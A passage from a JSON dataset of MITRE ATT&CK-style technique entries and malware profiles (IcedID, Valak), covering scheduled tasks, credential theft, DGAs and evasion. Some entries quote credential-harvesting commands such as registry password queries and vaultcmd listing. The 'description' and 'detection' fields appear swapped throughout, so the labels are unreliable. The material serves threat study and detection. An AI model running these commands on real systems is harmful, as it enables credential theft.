                "description": "Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",
                "detection": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At (Windows)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1082",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Information Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
                "detection": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1069",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Permission Groups Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "S0483",
            "type": "tool",
            "attributes": {
                "name": "IcedID",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "IcedID is a modular banking malware designed to steal financial information that has been observed in the wild since at least 2017.  IcedID  has been downloaded by Emotet in multiple campaigns.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.002": "Domain Account",
                    "T1027.003": "Steganography",
                    "T1027.002": "Software Packing",
                    "T1218.007": "Msiexec",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.004": "Asynchronous Procedure Call",
                    "T1053.005": "Scheduled Task",
                    "T1185": "Man in the Browser",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1069": "Permission Groups Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 19
        },
        {
            "id": "T1555.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Credential Manager",
                "chain_phase": "credential-access",
                "description": "Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:“Windows Credentials”</code>).(Citation: Malwarebytes The Windows Vault)\n\nConsider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nConsider monitoring file reads to Vault locations, <code>%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)",
                "detection": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted <code>.vcrd</code> files, located under <code>%Systemdrive%\\Users\\\\Username\\AppData\\Local\\Microsoft\\\\Vault/Credentials\\</code>. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may gather credentials by reading files located inside of the Credential Lockers. Adversaries may also abuse Windows APIs such as <code>CredEnumerateA</code> to list credentials managed by the Credential Manager.\n\nAdversaries may use password recovery tools to obtain plain text passwords from the Credential Manager.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1132.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Standard Encoding",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.  Some data encoding systems may also result in data compression, such as gzip.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1564.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "NTFS File Attributes",
                "chain_phase": "defense-evasion",
                "description": "Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)\n\nThere are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.\n\nThe Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)",
                "detection": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1566.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Spearphishing Link",
                "chain_phase": "initial-access",
                "description": "URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.",
                "detection": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Office 365",
                    "SaaS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1518.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Security Software Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.",
                "detection": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1087.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Account",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the Net utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1114.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote Email Collection",
                "chain_phase": "collection",
                "description": "Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).",
                "detection": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.",
                "is_subtype": true,
                "platforms": [
                    "Office 365",
                    "Windows",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1559.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Dynamic Data Exchange",
                "chain_phase": "execution",
                "description": "Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\n\nOLE and Office Open XML files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)",
                "detection": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.   \n\nMicrosoft Office documents can be poisoned with DDE commands  , directly or through embedded files , and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.  DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1552.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Credentials in Registry",
                "chain_phase": "credential-access",
                "description": "Monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.",
                "detection": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: \n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.010",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Regsvr32",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)",
                "detection": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1119",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Automated Collection",
                "chain_phase": "collection",
                "description": "Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1104",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Multi-Stage Channels",
                "chain_phase": "command-and-control",
                "description": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.",
                "detection": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1041",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exfiltration Over C2 Channel",
                "chain_phase": "exfiltration",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1008",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Fallback Channels",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0476",
            "type": "tool",
            "attributes": {
                "name": "Valak",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Valak is a multi-stage modular malware that can function as a standalone information stealer or downloader, first observed in 2019 targeting enterprises in the US and Germany.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1555.004": "Windows Credential Manager",
                    "T1059.007": "JavaScript",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1564.004": "NTFS File Attributes",
                    "T1204.002": "Malicious File",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1114.002": "Remote Email Collection",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1027.002": "Software Packing",
                    "T1552.002": "Credentials in Registry",
                    "T1218.010": "Regsvr32",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1119": "Automated Collection",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1104": "Multi-Stage Channels",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 33
        },
        {
            "id": "T1090.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Multi-hop Proxy",
                "chain_phase": "command-and-control",
                "description": "When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.\n\nIn context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.",
                "detection": "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. \n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging Patch System Image, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the Network Boundary Bridging method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "T1564.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Hidden Window",
                "chain_phase": "defense-evasion",
                "description": "Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.",
                "detection": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. \n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1568.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Generation Algorithms",
                "chain_phase": "command-and-control",
                "description": "Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\n\nMachine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)",
                "detection": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\n\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1497.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Time Based Evasion",
                "chain_phase": "defense-evasion",
                "description": "Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ",
                "detection": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
